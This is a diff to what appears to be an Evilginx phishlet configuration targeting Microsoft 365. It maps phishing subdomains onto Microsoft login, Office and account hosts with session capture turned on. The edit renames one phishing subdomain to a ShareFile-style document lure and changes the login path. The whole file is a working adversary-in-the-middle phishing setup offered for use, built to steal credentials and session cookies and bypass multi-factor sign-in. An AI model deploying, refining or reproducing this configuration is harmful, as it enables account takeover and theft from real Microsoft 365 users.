@@ -2,7 +2,7 @@ name: "o365"
 author: "@XCVDON"
 min_ver: "3.0.0"
 proxy_hosts:
-  - { phish_sub: "secure", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "sharefile-doc", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "billing", orig_sub: "www", domain: "office.com", session: true, is_landing: true, auto_filter: false }
   - { phish_sub: "hervw", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "hervw2", orig_sub: "privacynotice.account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true }
@@ -317,7 +317,7 @@ credentials:
 
 login:
   domain: 'login.microsoftonline.com'
-  path: '/'
+  path: '/?auth=2'
 
 
   
